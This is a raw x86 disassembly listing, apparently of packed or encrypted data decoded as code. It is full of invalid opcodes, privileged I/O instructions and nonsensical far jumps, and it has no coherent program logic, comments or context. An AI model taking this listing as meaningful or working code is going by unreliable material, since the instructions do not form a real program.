  41a63f:	jmp    0xb4e3f00e
  41a644:	xchg   esp,eax
  41a645:	adc    eax,0x21c80c67
  41a64a:	je     0x41a6b8
  41a64c:	mov    edx,0x7bb1dc60
  41a651:	xor    ebx,DWORD PTR [esi-0x386e4e17]
  41a657:	fsub   DWORD PTR [ebx-0x60]
  41a65a:	push   esp
  41a65b:	rcl    esi,cl
  41a65d:	out    dx,eax
  41a65e:	test   DWORD PTR [esi+0x675dc6bf],edi
  41a664:	mov    ebx,0xb56745cb
  41a669:	ds inc edx
  41a66b:	sbb    al,0xde
  41a66d:	dec    BYTE PTR [eax]
  41a66f:	pushf  
  41a670:	sti    
  41a671:	and    BYTE PTR [edx],dh
  41a673:	in     al,0x1d
  41a675:	jo     0x41a684
  41a677:	mov    BYTE PTR [ebx],bh
  41a679:	xor    edx,DWORD PTR [ecx-0x3f]
  41a67c:	sar    BYTE PTR [ecx-0xbb33999],0x60
  41a683:	loop   0x41a655
  41a685:	(bad)  
  41a686:	fidivr WORD PTR [ebx]
  41a688:	ror    DWORD PTR [edx+esi*8-0x6a78da28],1
  41a68f:	or     dh,dl
  41a691:	sub    cl,dl
  41a693:	jmp    0x46a:0x47657c49
  41a69a:	dec    ecx
  41a69b:	mov    edi,0xbb7422f0
  41a6a0:	stos   BYTE PTR es:[edi],al
  41a6a1:	nop
  41a6a2:	ins    DWORD PTR es:[edi],dx
  41a6a3:	ins    BYTE PTR es:[edi],dx
  41a6a4:	fist   DWORD PTR [edi+ecx*2-0x64]
  41a6a8:	adc    edi,DWORD PTR [edx]
  41a6aa:	xchg   DWORD PTR [esi+0x5d],esi
  41a6ad:	push   esp
  41a6ae:	and    eax,0x7f130ea
  41a6b3:	jnp    0x41a70e
  41a6b5:	arpl   dx,di
  41a6b7:	fdiv   QWORD PTR [eax-0x5feaffad]
  41a6bd:	mov    ah,BYTE PTR [edi+0x61516d01]
  41a6c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6c4:	add    edi,DWORD PTR [ebx]
  41a6c6:	nop
  41a6c7:	adc    bl,BYTE PTR [esp+eax*8]
  41a6ca:	cli    
  41a6cb:	xchg   ebp,eax
  41a6cc:	sub    DWORD PTR [edx+0x5c],esi
  41a6cf:	retf   0x453
  41a6d2:	inc    ecx
  41a6d3:	icebp  
  41a6d4:	and    eax,0x4db68e53
  41a6d9:	push   edx
  41a6da:	fcom   QWORD PTR [ecx+0x542ad743]
  41a6e0:	sbb    BYTE PTR [edi-0x2f],ch
  41a6e3:	test   dl,bl
  41a6e5:	pop    ecx
  41a6e6:	dec    sp
  41a6e8:	or     al,0x27
  41a6ea:	ss int3 
  41a6ec:	pop    ss
  41a6ed:	or     bl,ch
  41a6ef:	jecxz  0x41a732
  41a6f1:	ret    0x25dc
  41a6f4:	icebp  
  41a6f5:	and    ecx,DWORD PTR [esi]
  41a6f7:	and    eax,0xbcb16581
  41a6fc:	aad    0x1
  41a6fe:	or     eax,DWORD PTR [ebx]
  41a700:	pop    esi
  41a701:	dec    ecx
  41a702:	and    BYTE PTR [edi],al
  41a704:	inc    esp
  41a705:	sar    BYTE PTR [edx+0x1],cl
  41a708:	xchg   edx,eax
  41a709:	popf   
  41a70a:	int3   
  41a70b:	jmp    FWORD PTR [ebp-0x3fb189ca]
  41a711:	or     ah,BYTE PTR [ebp-0x15cc77fa]
  41a717:	pusha  
  41a718:	daa    
  41a719:	gs and eax,0x1be3fef
  41a71f:	dec    esp
  41a720:	push   0x5b2b0b83
  41a725:	pop    esp
  41a726:	xlat   BYTE PTR ds:[ebx]
  41a727:	xlat   BYTE PTR ds:[ebx]
  41a728:	shl    BYTE PTR [ecx+0x70],1
  41a72b:	rol    DWORD PTR [edx+0x1d],cl
  41a72e:	dec    esi
  41a72f:	mov    ch,0x1c
  41a731:	mov    dl,bl
  41a733:	mov    esp,0xc56d3f5
  41a738:	je     0x41a785
  41a73a:	jae    0x41a784
  41a73c:	jmp    0x41a74d
  41a73e:	fcomi  st,st(5)
  41a740:	mov    ds:0x34a7fc33,eax
  41a745:	iret   
  41a746:	pop    edx
  41a747:	or     edx,DWORD PTR [edi+eiz*1-0x4abb4f05]
  41a74e:	inc    ebp
  41a74f:	jmp    0x6369c7d3
  41a754:	push   eax
  41a755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a756:	loope  0x41a71b
  41a758:	sub    ecx,DWORD PTR [ebp-0x54]
  41a75b:	sti    
  41a75c:	test   ecx,ecx
  41a75e:	int3   
  41a75f:	scas   eax,DWORD PTR es:[edi]
  41a760:	ret    
  41a761:	pushf  
  41a762:	jp     0x41a785
  41a764:	sub    ecx,DWORD PTR [edx-0x3e]
  41a767:	and    al,0xe9
  41a769:	rcl    BYTE PTR [ecx-0x75813063],cl
  41a76f:	ret    0x836a
  41a772:	add    DWORD PTR [edi-0x46ea994d],ebx
  41a778:	cdq    
  41a779:	test   ebx,esi
  41a77b:	sub    DWORD PTR [esi],ebp
  41a77d:	inc    ebx
  41a77e:	xchg   esi,eax
  41a77f:	pop    ds
  41a780:	dec    edi
  41a781:	jne    0x41a778
  41a783:	das    
  41a784:	(bad)  
  41a785:	jbe    0x41a753
  41a787:	add    eax,0x42044188
  41a78c:	pusha  
  41a78d:	imul   esi,ebx,0x1bad4413
  41a793:	dec    ebx
  41a794:	test   al,0x28
  41a796:	out    0x4f,eax
  41a798:	fld    DWORD PTR [ecx]
  41a79a:	push   0xe9aec2c6
  41a79f:	(bad)  [ebx+0x5c97e7cc]
  41a7a5:	dec    ebp
  41a7a6:	push   ss
  41a7a7:	push   ecx
  41a7a8:	mov    edi,0x8079d375
  41a7ad:	ss mov ch,0x56
  41a7b0:	fst    st(0)
  41a7b2:	(bad)  
  41a7b3:	stos   DWORD PTR es:[edi],eax
  41a7b4:	pop    esp
  41a7b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7b6:	xchg   esi,eax
  41a7b7:	dec    eax
  41a7b8:	cs jecxz 0x41a7ac
  41a7bb:	cmp    bh,BYTE PTR [edx+0x6d699b8c]
  41a7c1:	mov    dh,0x5d
  41a7c3:	cmp    DWORD PTR [edx],edi
  41a7c5:	and    al,0x36
  41a7c7:	xacquire xchg BYTE PTR [ebx+0x3b4df42e],ch
  41a7ce:	rol    BYTE PTR ss:[esi],0x4c
  41a7d2:	in     eax,0x41
  41a7d4:	ret    0x94b
  41a7d7:	fdivp  st(7),st
  41a7d9:	push   esi
  41a7da:	icebp  
  41a7db:	cdq    
  41a7dc:	mov    edi,DWORD PTR ds:0x40204b48
  41a7e2:	jbe    0x41a7e1
  41a7e4:	or     BYTE PTR [ecx],ch
  41a7e6:	in     al,0xc9
  41a7e8:	fidivr WORD PTR [ebx+0x61db5fa3]
  41a7ee:	fimul  DWORD PTR [edi+edi*8]
  41a7f1:	mov    ecx,0x1e4911dc
  41a7f6:	xlat   BYTE PTR ds:[ebx]
  41a7f7:	cmp    al,0x76
  41a7f9:	addr16 (bad) 
  41a7fb:	fsubr  st(2),st
  41a7fd:	imul   edx,DWORD PTR [esp+ebx*4],0xffffffa5
  41a801:	les    esi,FWORD PTR ss:[esi+0x4b399f02]
  41a808:	stos   BYTE PTR es:[edi],al
  41a809:	je     0x41a7fa
  41a80b:	out    0x5a,al
  41a80d:	push   ebx
  41a80f:	jp     0x41a79b
  41a811:	gs test eax,0xa465a5c4
  41a817:	rcpps  xmm4,XMMWORD PTR [esi+0x5643002]
  41a81e:	add    DWORD PTR [edi+0x6f],esi
  41a821:	(bad)  
  41a822:	cli    
  41a823:	int    0xdb
  41a825:	pop    ss
  41a826:	das    
  41a827:	dec    esp
  41a828:	dec    DWORD PTR [esi+0x22]
  41a82b:	daa    
  41a82c:	ins    DWORD PTR es:[edi],dx
  41a82d:	(bad)  
  41a82e:	call   0x1264ad34
  41a833:	outs   dx,BYTE PTR ds:[esi]
  41a834:	mov    al,ds:0x99328576
  41a839:	mov    ch,0xf6
  41a83b:	loope  0x41a7de
  41a83d:	cmc    
  41a83e:	jo     0x41a7c0
  41a840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a841:	mov    esi,0xe42d34d8
  41a846:	jle    0x41a842
  41a848:	or     ch,BYTE PTR [ebx-0x2a38cac6]
  41a84e:	dec    esp
  41a84f:	repz adc DWORD PTR [edi],eax
  41a852:	or     DWORD PTR [eiz*2-0x2967ccad],ebp
  41a859:	sbb    DWORD PTR [eax-0x7f],ebp
  41a85c:	enter  0x1d0e,0xb3
  41a860:	mov    ch,0xa5
  41a862:	addr16 pushf 
  41a864:	fcomp  QWORD PTR [esi]
  41a866:	jp     0x41a81a
  41a868:	ins    DWORD PTR es:[edi],dx
  41a869:	ror    BYTE PTR [edi-0x69b9d4d3],0xc6
  41a870:	retf   
  41a871:	js     0x41a8f2
  41a873:	(bad)  
  41a874:	fld    QWORD PTR [eax+edx*4+0x3adb8669]
  41a87b:	sbb    edx,esp
  41a87d:	aam    0x5f
  41a87f:	call   0xa6c6:0xb9c0cb98
  41a886:	loope  0x41a80c
  41a888:	adc    ebx,esp
  41a88a:	das    
  41a88b:	mov    dl,0xe3
  41a88d:	out    0xb2,al
  41a88f:	test   al,0xa4
  41a891:	sahf   
  41a892:	je     0x41a8d1
  41a894:	int    0xf8
  41a896:	out    0x63,eax
  41a898:	(bad)
  41a89b:	push   ebp
  41a89c:	daa    
  41a89d:	sub    eax,DWORD PTR [eax-0x70fd9206]
  41a8a3:	dec    edx
  41a8a4:	hlt    
  41a8a5:	dec    ecx
  41a8a6:	out    dx,al
  41a8a7:	(bad)  
  41a8a8:	mov    esi,0xfde229b2
  41a8ad:	(bad)  ds:0x74a96948
  41a8b3:	mov    WORD PTR [esi-0x2d],cs
  41a8b6:	arpl   sp,bp
  41a8b8:	fucom  st(4)
  41a8ba:	push   ecx
  41a8bb:	cmp    BYTE PTR [ecx+0x4252a5e9],0x82
  41a8c2:	push   0xffffff87
  41a8c4:	pop    esi
  41a8c5:	jns    0x41a8b4
  41a8c7:	nop
  41a8c8:	lods   eax,DWORD PTR ds:[esi]
  41a8c9:	or     al,0x8a
  41a8cb:	or     al,0x2f
  41a8cd:	jb     0x41a8fd
  41a8cf:	test   eax,0x25ecc2e4
  41a8d4:	push   esp
  41a8d5:	xchg   BYTE PTR [edx+eiz*8],dh
  41a8d8:	ret    
  41a8d9:	add    al,0x3c
  41a8db:	or     DWORD PTR [ebp+0x36],ebx
  41a8de:	or     dh,BYTE PTR [edi+0x57]
  41a8e1:	xor    eax,0x260eec4
  41a8e6:	push   0xb1d7f03
  41a8eb:	xor    BYTE PTR [ebx+0x51291fb0],al
  41a8f1:	or     esp,DWORD PTR [ecx-0x64]
  41a8f4:	push   ecx
  41a8f5:	rcr    edx,cl
  41a8f7:	in     eax,0x68
  41a8f9:	repnz (bad)
  41a8fc:	or     eax,0xed9148a7
  41a901:	fiadd  WORD PTR [eax]
  41a903:	outs   dx,BYTE PTR ds:[esi]
  41a904:	dec    esp
  41a905:	pop    esp
  41a906:	sub    dl,dh
  41a908:	lds    edx,FWORD PTR [ebx+0x703b5fe2]
  41a90e:	pop    esi
  41a90f:	inc    esp
  41a910:	add    BYTE PTR [edx+0x7449c0f3],dh
  41a916:	jp     0x41a8aa
  41a918:	mov    esp,0x36a45ecd
  41a91d:	dec    DWORD PTR [edx]
  41a91f:	xor    ch,cl
  41a921:	pop    ecx
  41a922:	clc    
  41a923:	js     0x41a8f8
  41a925:	scas   eax,DWORD PTR es:[edi]
  41a926:	repnz push ebp
  41a928:	and    al,0xcb
  41a92a:	sub    ah,BYTE PTR [ebx+0x73]
  41a92d:	xchg   esp,eax
  41a92e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a92f:	icebp  
  41a930:	inc    BYTE PTR [eax+0x56a28845]
  41a936:	sub    esi,DWORD PTR [eax-0x49]
  41a939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a93a:	arpl   WORD PTR [ebp+0x6d],dx
  41a93d:	iret   
  41a93e:	or     cl,dh
  41a940:	pusha  
  41a941:	and    edi,ebx
  41a943:	mov    edx,0x944dcb7d
  41a948:	repz dec edi
  41a94a:	pop    esi
  41a94b:	xor    eax,0x77b1ad59
  41a950:	jecxz  0x41a90d
  41a952:	pop    ebx
  41a953:	in     eax,dx
  41a954:	cli    
  41a955:	idiv   DWORD PTR [edi]
  41a957:	push   eax
  41a958:	(bad)  
  41a959:	rcl    BYTE PTR [ebp+ecx*4+0x624143cb],1
  41a960:	test   eax,0x55491a9c
  41a965:	xchg   ebx,eax
  41a966:	stos   DWORD PTR es:[edi],eax
  41a967:	ds add edi,ebp
  41a96a:	cmp    BYTE PTR [edx+ebx*2-0x20949275],cl
  41a971:	loop   0x41a99c
  41a973:	jbe    0x41a986
  41a975:	dec    esi
  41a976:	inc    ebp
  41a977:	adc    DWORD PTR [edi-0x33],0xc18a915d
  41a97e:	and    al,0x14
  41a980:	push   es
  41a981:	bound  ebx,QWORD PTR [edx-0x6c05b87c]
  41a987:	adc    ch,BYTE PTR [eax]
  41a989:	inc    ebp
  41a98a:	adc    eax,0x4adb7570
  41a98f:	jge    0x41a9ea
  41a991:	in     eax,0x93
  41a993:	js     0x41a983
  41a995:	and    BYTE PTR [ebx],dh
  41a997:	sub    cl,ah
  41a999:	outs   dx,BYTE PTR ds:[esi]
  41a99a:	leave  
  41a99b:	push   edi
  41a99c:	(bad)  
  41a99d:	or     al,0x31
  41a99f:	add    DWORD PTR [edx+0x12],edx
  41a9a2:	mov    BYTE PTR [eax+0x4b],bl
  41a9a5:	sbb    DWORD PTR [eax-0x13],esp
  41a9a8:	jp     0x41a9d1
  41a9aa:	int    0xd
  41a9ac:	adc    ebx,ebx
  41a9ae:	aaa    
  41a9af:	or     bh,ah
  41a9b1:	cmp    ebp,eax
  41a9b3:	(bad)  
  41a9b4:	outs   dx,DWORD PTR ds:[esi]
  41a9b5:	test   al,0xc7
  41a9b7:	xor    eax,eax
  41a9b9:	add    al,bl
  41a9bb:	loop   0x41a9e1
  41a9bd:	ja     0x41a9cd
  41a9bf:	jbe    0x41aa11
  41a9c1:	int    0x7b
  41a9c3:	pop    ebx
  41a9c4:	pop    ebp
  41a9c5:	call   0x9a998878
  41a9ca:	jecxz  0x41aa02
  41a9cc:	jmp    FWORD PTR [ebx+0x1f8777ed]
  41a9d2:	popa   
  41a9d3:	xor    ch,al
  41a9d5:	sub    BYTE PTR [ecx],dl
  41a9d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9d8:	dec    ebx
  41a9d9:	popa   
  41a9da:	pop    edi
  41a9db:	push   ecx
  41a9dc:	arpl   WORD PTR [eax+esi*1-0x7fb2c3c5],ax
  41a9e3:	(bad)  
  41a9e5:	sbb    al,0x75
  41a9e7:	lea    ebx,[ebp+0x563326b]
  41a9ed:	push   edi
  41a9ee:	push   es
  41a9ef:	(bad)  
  41a9f0:	sbb    eax,0xe362349
  41a9f5:	ret    
  41a9f6:	iret   
  41a9f7:	pop    ecx
  41a9f8:	xchg   esp,eax
  41a9f9:	ret    
  41a9fa:	into   
  41a9fb:	xchg   ecx,eax
  41a9fc:	lods   al,BYTE PTR ds:[esi]
  41a9fd:	jno    0x41aa29
  41a9ff:	push   esi
  41aa00:	sub    DWORD PTR [edi+0xa],eax
  41aa03:	mov    ebp,0xcbfb3aa7
  41aa08:	out    dx,al
  41aa09:	cmp    eax,0xaa78ffa9
  41aa0e:	dec    edx
  41aa0f:	sbb    BYTE PTR [edi],al
  41aa11:	test   BYTE PTR [ebx+0x2891bea6],dl
  41aa17:	or     al,0xbf
  41aa19:	jle    0x41aa86
  41aa1b:	dec    eax
  41aa1c:	sub    DWORD PTR [ebx+0x43582e7f],edi
  41aa22:	xor    dh,0x60
  41aa25:	mov    esi,DWORD PTR [edi+0x76]
  41aa28:	hlt    
  41aa29:	ffreep st(7)
  41aa2b:	sbb    eax,0xb4a12f33
  41aa30:	jge    0x41aa7c
  41aa32:	inc    eax
  41aa33:	jne    0x41aa41
  41aa35:	nop
  41aa36:	pop    edi
  41aa37:	(bad)
  41aa3b:	stc    
  41aa3c:	test   DWORD PTR [ebx+0x10208c27],esp
  41aa42:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41aa44:	icebp  
  41aa45:	call   0x9375c174
  41aa4a:	adc    eax,0xbae3dbcb
  41aa4f:	fisub  DWORD PTR [esi+ebp*1]
  41aa52:	dec    edi
  41aa53:	mov    eax,0x188896c6
  41aa58:	arpl   WORD PTR ds:0x9882d34d,bp
  41aa5e:	sub    eax,0x9aca20d2
  41aa63:	inc    esi
  41aa64:	hlt    
  41aa65:	mov    dl,0x15
  41aa67:	repz mov bh,0xf5
  41aa6a:	xchg   DWORD PTR [eax],esi
  41aa6c:	adc    ch,BYTE PTR [esi+0x45]
  41aa6f:	xchg   DWORD PTR [ebx-0x38d7ef5f],eax
  41aa75:	sub    eax,0x472b575f
  41aa7a:	cld    
  41aa7b:	inc    esi
  41aa7c:	xchg   esi,eax
  41aa7d:	imul   ebx,ebx,0x98117854
  41aa83:	cmp    bh,BYTE PTR [edi-0x69]
  41aa86:	dec    ecx
  41aa87:	js     0x41aaac
  41aa89:	xchg   esi,eax
  41aa8a:	in     eax,dx
  41aa8b:	rol    DWORD PTR [edx],cl
  41aa8d:	pop    ebx
  41aa8e:	and    eax,0x40948d4e
  41aa93:	ins    BYTE PTR es:[edi],dx
  41aa94:	rol    DWORD PTR [ebx-0x48],1
  41aa97:	jmp    0xc4d5741c
  41aa9c:	xchg   esp,eax
  41aa9d:	xor    BYTE PTR [ebp-0x2c],0xc7
  41aaa1:	inc    esi
  41aaa2:	jae    0x41aa74
  41aaa4:	and    eax,DWORD PTR [ecx+0x77]
  41aaa7:	ja     0x41aa8a
  41aaa9:	call   0xc771d467
  41aaae:	pop    ecx
  41aaaf:	jbe    0x41aa46
  41aab1:	dec    ebx
  41aab2:	cdq    
  41aab3:	sbb    ah,bh
  41aab5:	xchg   esi,eax
  41aab6:	cmp    DWORD PTR [edx],esi
  41aab8:	sbb    al,0xa3
  41aaba:	add    BYTE PTR [ebp-0x7152f0a0],ch
  41aac0:	add    edi,edi
  41aac2:	in     al,dx
  41aac3:	mov    eax,ds:0x753cb57c
  41aac8:	mov    bl,dh
  41aaca:	push   esi
  41aacb:	and    DWORD PTR [edi-0x49beae88],eax
  41aad1:	push   ebp
  41aad2:	popa   
  41aad3:	xchg   DWORD PTR [ecx-0x67ec5519],ecx
  41aad9:	sbb    eax,0x1934f899
  41aade:	ror    DWORD PTR [edi],1
  41aae0:	retf   0xb894
  41aae3:	mov    eax,ds:0xa27ecfe
  41aae8:	mov    esp,0xcfb13427
  41aaed:	cmp    bl,0x9
  41aaf0:	pop    ss
  41aaf1:	sbb    al,BYTE PTR [edi]
  41aaf3:	mov    al,BYTE PTR [eax]
  41aaf5:	lds    esp,FWORD PTR [edi]
  41aaf7:	xor    ch,BYTE PTR [ebx-0x76b9e285]
  41aafd:	data16 test BYTE PTR [esi+0x2d89d754],dl
  41ab04:	or     BYTE PTR [ebp+ebp*4+0x743da35a],0x42
  41ab0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab0d:	xchg   edi,eax
  41ab0e:	aam    0x9a
  41ab10:	jg     0x41ab3b
  41ab12:	push   esp
  41ab13:	(bad)  [edx-0x4c]
  41ab16:	add    eax,0xb297d97a
  41ab1b:	jo     0x41aae9
  41ab1d:	stos   BYTE PTR es:[edi],al
  41ab1e:	shr    BYTE PTR [edi],cl
  41ab20:	into   
  41ab21:	mov    edi,0x64a63ba7
  41ab26:	sar    DWORD PTR [edi+0x3b],1
  41ab29:	dec    ebx
	...
  41acfa:	inc    ecx
  41acfb:	inc    BYTE PTR [ebx+eiz*1-0x1188441]
  41ad02:	push   ecx
  41ad03:	jecxz  0x41ad2a
  41ad05:	arpl   WORD PTR [ebx-0x70137f42],cx
  41ad0b:	test   DWORD PTR [ecx],eax
  41ad0d:	add    BYTE PTR [edx],ah
  41ad0f:	pop    es
  41ad10:	add    BYTE PTR [eax],al
  41ad12:	mov    edi,0xf76804be
  41ad17:	aad    0x9b
  41ad19:	push   0x50
  41ad1b:	adc    BYTE PTR [esi],0x65
  41ad1e:	sahf   
  41ad1f:	adc    ebp,ebp
  41ad21:	test   eax,0x31fbd536
  41ad26:	mov    esi,0xf8ddbe81
  41ad2b:	xor    BYTE PTR [ecx+esi*8-0x44],0x9a
  41ad30:	jp     0x41ad06
  41ad32:	(bad)  
  41ad34:	adc    eax,DWORD PTR [edx]
  41ad36:	jge    0x41ad66
  41ad38:	inc    esp
  41ad39:	cmp    DWORD PTR [esi-0x75],ecx
  41ad3c:	fistp  WORD PTR [esi]
  41ad3e:	xchg   edx,eax
  41ad3f:	fsub   QWORD PTR [edx]
  41ad41:	scas   eax,DWORD PTR es:[edi]
  41ad42:	mov    cs,WORD PTR [edi+0x2e]
  41ad45:	stos   BYTE PTR es:[edi],al
  41ad46:	jg     0x41ad6d
  41ad48:	pop    es
  41ad49:	gs int3 
  41ad4b:	mov    ds:0x66edd333,eax
  41ad50:	or     edx,DWORD PTR [eax]
  41ad52:	out    0xb,eax
  41ad54:	add    ebx,ebp
  41ad56:	push   edi
  41ad57:	es or  eax,0xa474c921
  41ad5d:	into   
  41ad5e:	je     0x41ad81
  41ad60:	xchg   ebp,eax
  41ad61:	adc    eax,0xceaa964b
  41ad66:	mov    esp,0x2e0cdec6
  41ad6b:	les    ebp,FWORD PTR [eax+0x8]
  41ad6e:	xchg   ebx,eax
  41ad6f:	mov    eax,0xa730eff0
  41ad74:	loop   0x41adce
  41ad76:	int    0xdd
  41ad78:	push   edi
  41ad79:	cs stos DWORD PTR es:[edi],eax
  41ad7b:	aas    
  41ad7c:	imul   BYTE PTR ds:0xca82ddfe
  41ad82:	mov    ah,0x8e
  41ad84:	jae    0x41ad84
  41ad86:	stos   DWORD PTR es:[edi],eax
  41ad87:	test   eax,0x514c086c
  41ad8c:	or     dl,0x68
  41ad8f:	aad    0xcd
  41ad91:	jne    0x41ad6e
  41ad93:	push   0x52a5e6dd
  41ad98:	and    eax,0xc0b57290
  41ad9d:	mov    ebx,edx
  41ad9f:	pushf  
  41ada0:	mov    ds:0x166c5fc1,eax
  41ada5:	sbb    cl,BYTE PTR [ebp+edx*2-0x377d5a93]
  41adac:	mov    ds:0xbbc7a11a,eax
  41adb1:	push   eax
  41adb2:	out    0xa9,eax
  41adb4:	ss mov edx,0x5a580541
  41adba:	cld    
  41adbb:	and    DWORD PTR [esi],0x829a7277
  41adc1:	inc    eax
  41adc2:	loop   0x41ae3a
  41adc4:	mov    ecx,0x860db8ae
  41adc9:	add    bh,dh
  41adcb:	sub    DWORD PTR [esi],edi
  41adcd:	fbld   TBYTE PTR [ebx-0x63cbf215]
  41add3:	sahf   
  41add4:	dec    edx
  41add5:	sub    bl,BYTE PTR [ecx]
  41add7:	push   eax
  41add8:	enter  0xd19e,0xe2
  41addc:	aad    0x27
  41adde:	mov    bl,0x7
  41ade0:	(bad)  
  41ade1:	cmp    BYTE PTR [ecx],dl
  41ade3:	gs aaa 
  41ade5:	mov    BYTE PTR [ecx-0x480df5fe],al
  41adeb:	iret   
  41adec:	shl    BYTE PTR [edx],0x36
  41adef:	mov    esi,0x1f96b3a6
  41adf4:	mov    ss,edi
  41adf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adf7:	adc    DWORD PTR [edx-0x61521c7],0xf98b49ac
  41ae01:	add    al,0xb5
  41ae03:	pop    ebx
  41ae04:	sti    
  41ae05:	clc    
  41ae06:	bound  edx,QWORD PTR [ebx]
  41ae08:	pop    ecx
  41ae09:	push   es
  41ae0a:	sub    esp,DWORD PTR [ebp-0x1581738]
  41ae10:	aaa    
  41ae11:	jnp    0x41ae54
  41ae13:	dec    esp
  41ae14:	adc    DWORD PTR [ecx],esp
  41ae16:	inc    edx
  41ae17:	sbb    BYTE PTR [edx-0x52],al
  41ae1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae1b:	arpl   WORD PTR [ebx+0x2f],sp
  41ae1e:	clc    
  41ae1f:	push   0x80f68759
  41ae24:	pop    ecx
  41ae25:	clc    
  41ae26:	popf   
  41ae27:	js     0x41adbf
  41ae29:	push   edx
  41ae2a:	fild   WORD PTR [edx]
  41ae2c:	jp     0x41adb2
  41ae2e:	jl     0x41ae3c
  41ae30:	fild   QWORD PTR [eax+ecx*8]
  41ae33:	loope  0x41ae9d
  41ae35:	or     BYTE PTR [edi],bh
  41ae37:	mov    ds:0x13105f07,eax
  41ae3c:	cmp    dl,bh
  41ae3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae3f:	cmp    bh,BYTE PTR [ecx-0x6b4da617]
  41ae45:	jg     0x41ae8e
  41ae47:	cmp    dh,BYTE PTR [ecx+ebp*8]
  41ae4a:	js     0x41add4
  41ae4c:	sar    bh,1
  41ae4e:	jne    0x41ae44
  41ae50:	in     al,0x24
  41ae52:	mov    cl,0xe5
  41ae54:	push   edx
  41ae55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae56:	pop    edx
  41ae57:	xchg   esp,eax
  41ae58:	pusha  
  41ae59:	out    0x74,al
  41ae5b:	push   0x53
  41ae5d:	std    
  41ae5e:	sub    edi,DWORD PTR [edi+0x3400fe08]
  41ae64:	test   dh,cl
  41ae66:	je     0x41ae07
  41ae68:	push   esp
  41ae69:	jnp    0x41aec8
  41ae6b:	nop
  41ae6c:	xchg   edx,eax
  41ae6d:	in     al,dx
  41ae6e:	rol    DWORD PTR [edi],1
  41ae70:	fsubr  DWORD PTR ds:0x96a4e26f
  41ae76:	shr    DWORD PTR [ecx-0x7ebac1af],cl
  41ae7c:	lahf   
  41ae7d:	mov    ch,0x8d
  41ae7f:	push   ecx
  41ae80:	mov    ds:0xd89a973e,al
  41ae85:	mov    ds:0x85dc3e20,eax
  41ae8a:	jmp    0x41aed8
  41ae8c:	mov    ebp,DWORD PTR [edi+ebx*2]
  41ae8f:	std    
  41ae90:	add    ebx,eax
  41ae92:	jle    0x41ae4e
  41ae94:	ret    
  41ae95:	mov    ds:0x192817e2,eax
  41ae9a:	fstp   QWORD PTR [edi+0x7fb2dd15]
  41aea0:	sbb    BYTE PTR [ebx],0x6b
  41aea3:	or     bl,BYTE PTR [edi-0x558b7e9f]
  41aea9:	sub    DWORD PTR [ebx-0x103e8d76],esi
  41aeaf:	and    al,0x3b
  41aeb1:	rol    BYTE PTR [ecx+0x49],0x90
  41aeb5:	loope  0x41af34
  41aeb7:	or     DWORD PTR [edx+0x62],0x4a0ff9ec
  41aebe:	xor    esp,DWORD PTR [ecx]
  41aec0:	(bad)  
  41aec1:	mov    WORD PTR [edx],ds
  41aec3:	or     DWORD PTR [edx],esi
  41aec5:	lds    eax,FWORD PTR ds:0x881fd32b
  41aecb:	push   esi
  41aecc:	stos   DWORD PTR es:[edi],eax
  41aecd:	cwde   
  41aece:	dec    esi
  41aecf:	xor    ebp,DWORD PTR [ebx]
  41aed1:	dec    edx
  41aed2:	push   edi
  41aed3:	loopne 0x41aed2
  41aed5:	xchg   ah,dl
  41aed7:	pop    esi
  41aed8:	jmp    0x7db1:0x29fbb71b
  41aedf:	(bad)  
  41aee0:	pop    ss
  41aee1:	cmp    ch,BYTE PTR [edx+edx*1-0x4f]
  41aee5:	mov    edx,0x931fc621
  41aeea:	pop    ss
  41aeeb:	lds    ebx,FWORD PTR [eax]
  41aeed:	mov    edi,0x9ce330fa
  41aef2:	lds    esi,FWORD PTR [ebx]
  41aef4:	sti    
  41aef5:	push   edx
  41aef6:	pusha  
  41aef7:	mov    bh,0x5e
  41aef9:	mov    ah,0xaf
  41aefb:	mov    dh,BYTE PTR [esi+0x3b]
  41aefe:	inc    esi
  41aeff:	push   edx
  41af00:	aam    0x39
  41af02:	ins    BYTE PTR es:[edi],dx
  41af03:	cld    
  41af04:	mov    edx,0x53e40415
  41af09:	arpl   WORD PTR [eax],bx
  41af0b:	imul   DWORD PTR [edi+0x46]
  41af0e:	iret   
  41af0f:	xchg   esp,eax
  41af10:	(bad)  
  41af11:	arpl   si,cx
  41af13:	push   cs
  41af14:	pop    es
  41af15:	adc    eax,0x3e76ad24
  41af1a:	pop    esi
  41af1b:	jo     0x41af16
  41af1d:	add    eax,DWORD PTR [eax]
  41af1f:	xor    BYTE PTR [ebx],al
  41af21:	dec    ebp
  41af22:	outs   dx,DWORD PTR ds:[esi]
  41af23:	out    dx,al
  41af24:	mov    ecx,0xa445cae5
  41af29:	jo     0x41aedb
  41af2b:	in     eax,dx
  41af2c:	mov    edx,0x395a985d
  41af31:	mov    eax,0xec07271f
  41af36:	sub    DWORD PTR [eax+0x6c],eax
  41af39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af3a:	inc    ebx
  41af3b:	in     al,dx
  41af3c:	inc    esi
  41af3d:	jecxz  0x41af18
  41af3f:	mov    eax,0x6fcd0499
  41af44:	cs std 
  41af46:	xor    BYTE PTR ss:[ebp-0x5],bl
  41af4a:	ss loope 0x41aed6
  41af4d:	call   0xe210f764
  41af52:	sbb    ch,BYTE PTR [ebx+0x45]
  41af55:	ror    BYTE PTR [edi-0x1d],cl
  41af58:	fld    QWORD PTR [eax]
  41af5a:	xor    cl,al
  41af5c:	(bad)  
  41af5e:	ja     0x41af02
  41af60:	adc    bl,dl
  41af62:	push   edi
  41af63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af64:	pop    edi
  41af65:	sub    bl,BYTE PTR [ecx-0x44]
  41af68:	stc    
  41af69:	mov    bh,0xcd
